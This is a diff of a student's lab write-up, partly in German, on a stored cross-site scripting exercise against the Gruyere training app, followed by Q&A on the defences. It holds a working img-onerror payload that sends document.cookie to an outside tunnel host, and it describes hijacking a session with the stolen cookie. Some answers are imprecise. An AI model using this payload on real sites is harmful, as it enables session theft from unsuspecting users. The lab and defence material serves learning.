@@ -73,3 +73,15 @@ runcmd:
 - Create Snippet on Attackers account on Gruyere:
   - enter this into input field: `<img src="x" onerror="new Image().src='<https://59614f9c88d865c5-35-153-157-12.serveousercontent.com>/?c='+encodeURIComponent(document.cookie)">` → now this runs a GET request to the attacker's server with the cookie as url parameter, and the user won't notice this.
   - It didn't log anything since the request kept failing, I believe it's due to my Firewall blocking the outgoing request
+  - I tested it on my personal computer and it worked, but I also had to disable the buffer by running `python3 -u -m http.server 9000`. ![img_14.png](img_14.png) ![img_15.png](img_15.png)
+  - then I had hijack the verteidiger-zak's session by setting the cookie in my browser to the stolen value. ![img_16.png](img_16.png) ![img_17.png](img_17.png) and it worked ![img_18.png](img_18.png)
+- Q&A
+- Warum konnte der Angreifer den Cookie des Verteidigers erhalten, ohne je dessen Passwort zu kennen oder Zugriff auf dessen Browser zu haben?
+- because on the same UID if I change the cookie in my browser, it will be the same for the victim's browser, since they are on the same UID. 
+- Welche Rolle spielt der new Image().src-Trick – warum funktioniert diese Technik trotz Same-Origin-Policy?
+- when image.src fails then onerror event is triggered, and the code in onerror is executed. Since the request is a simple GET request, it is not blocked by the Same-Origin-Policy.
+- Warum war der Serveo-Tunnel notwendig – was wäre passiert, wenn der Payload direkt http://<EC2-IP>:9000 verwendet hätte?
+- probably because of the protocol, since serveo.net provides an HTTPS endpoint, the request is not blocked by the browser.
+- Nennen Sie mindestens zwei technische Massnahmen, mit denen die Webapplikation diesen Angriff verhindert hätte.
+- Using HttpOnly cookies would have prevented this attack, since the malicious script would not have been able to access the cookie value. Also Encoding the output properly would have prevented the attack, since the script would not have been executed in the first place.
+- Was bewirkt das Secure-Flag bei einem Cookie, und in welcher Situation schützt es?
